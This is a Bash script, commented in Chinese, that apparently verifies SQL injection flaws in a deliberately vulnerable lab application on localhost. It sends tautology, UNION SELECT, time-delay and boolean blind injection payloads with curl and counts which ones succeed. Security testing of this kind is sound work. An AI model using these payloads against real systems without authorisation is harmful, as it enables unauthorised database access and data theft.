#!/bin/bash
# SQL 注入漏洞验证脚本

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

BASE_URL="http://localhost:8080"
TOTAL=0
PASSED=0
FAILED=0

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}SQL 注入漏洞验证脚本${NC}"
echo -e "${BLUE}========================================${NC}"
echo ""

# SQL注入测试
test_case() {
    local name="$1"
    local url="$2"
    local pattern="$3"
    TOTAL=$((TOTAL + 1))
    echo -e "\n${YELLOW}[测试 $TOTAL]${NC} $name"
    echo "URL: $url"

    response=$(curl -s "$url" 2>/dev/null)
    if echo "$response" | grep -qiE "$pattern"; then
        echo -e "  ${GREEN}[✓] 存在漏洞${NC}"
        PASSED=$((PASSED + 1))
    else
        echo -e "  ${RED}[✗] 测试失败${NC}"
        FAILED=$((FAILED + 1))
    fi
}

echo -e "${BLUE}=== SQL 注入测试 ===${NC}"

test_case "基于整型注入" \
    "${BASE_URL}/sqli/int/number?id=1 OR 1=1" \
    "admin|root"

test_case "基于字符串注入" \
    "${BASE_URL}/sqli/string?name=admin' OR '1'='1" \
    "admin|success"

test_case "搜索注入" \
    "${BASE_URL}/sqli/search?q=test' UNION SELECT 1,2,3--" \
    "test|1"

test_case "盲注-时间延迟" \
    "${BASE_URL}/sqli/time?id=1' WAITFOR DELAY '00:00:05'--" \
    ""

test_case "盲注-布尔逻辑" \
    "${BASE_URL}/sqli/boolean?id=1' AND 1=1--" \
    "success|true"

# 信息端点
echo -e "\n${YELLOW}[*] SQL 注入信息端点:${NC}"
info=$(curl -s "${BASE_URL}/sqli/info" 2>/dev/null)
echo "$info" | head -10

# 总结
echo -e "\n${BLUE}========================================${NC}"
echo -e "总测试数: ${YELLOW}$TOTAL${NC}"
echo -e "通过: ${GREEN}$PASSED${NC}"
echo -e "失败: ${RED}$FAILED${NC}"

if [ $FAILED -eq 0 ]; then
    echo -e "\n${GREEN}所有测试通过！${NC}"
fi
